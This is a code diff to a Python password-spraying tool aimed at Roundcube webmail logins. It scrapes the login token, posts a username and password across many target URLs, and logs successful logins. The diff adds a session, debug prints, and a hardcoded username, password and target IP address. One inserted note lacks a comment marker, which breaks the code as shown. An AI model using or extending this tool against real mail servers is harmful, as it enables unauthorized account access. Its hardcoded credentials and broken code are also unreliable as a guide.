@@ -50,9 +50,10 @@ class Sprayer(object):
         self.urls = normalized_urls
 
     def login(self, url):
+        session = requests.session()
         try:
             url = f"{url}"
-            req = requests.get(
+            req = session.get(
                 url=url,
                 headers=self.headers,
                 timeout=30,
@@ -70,7 +71,6 @@ class Sprayer(object):
         
         # parse the request_token needed for login
         try:
-            open("test.html", 'wb').write(req.content)
             '''
             
             we could do a apache default homepage check and if so then try /roundcubemail,
@@ -80,6 +80,8 @@ class Sprayer(object):
             '''
             request_token = req.text.split('"request_token":"', 1)[1].split('"', 1)[0].strip().rstrip()
             
+            print(f"{Fore.GREEN}[ Token ]: {request_token}")
+
             headers = self.headers
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
             url = f"{url}/?_task=login"
@@ -94,14 +96,17 @@ class Sprayer(object):
                 "_pass": self.password,
             }
 
+            print(url)
             # try logging in now
-            req = requests.post(
+            req = session.post(
                 url=url,
                 headers=headers,
                 data=data,
                 verify=False
             )
             # by status code we can see if it failed or succeeded & by the returned cookie name
+            for some reason valid logins for me are 200 and no cookie returned, but not in burpsuitem
+                figure out why because a != 401 is gonna give 100000 false positives ! 
             if req.status_code != 401 and 'roundcube_sessauth' in f"{req.cookies}":
                 print(f"{Fore.GREEN}[ {self.username}:{self.password}({url}) ]")
                 self.lock.acquire()
@@ -110,8 +115,10 @@ class Sprayer(object):
                 self.lock.release()
                 self.pbar.update()
                 return
-            # login failed
+
+            print(f"{Fore.YELLOW}{req.status_code}\n{req.cookies}")
             print(f"{Fore.RED}[ Login Failed ! ]")
+            open("test.html", 'wb').write(req.content)
             self.pbar.update()
         except Exception as err:
             print(f"{err}")
@@ -122,8 +129,11 @@ class Sprayer(object):
         self.normalize_urls()
         self.pbar = tqdm(total=len(self.urls), desc="Checking...")
 
-        self.username = input(f"[ Username to spray ]: ").strip().rstrip()
-        self.password = input(f"[ Password to spray ]: ").strip().rstrip()
+        # self.username = input(f"[ Username to spray ]: ").strip().rstrip()
+        # self.password = input(f"[ Password to spray ]: ").strip().rstrip()
+
+        self.username = "ubuntu"
+        self.password = "WEEDr0ckwws123!"
 
         self.login(f"http://198.18.2.187/roundcubemail")
         # with ThreadPoolExecutor(max_workers=100) as executor:
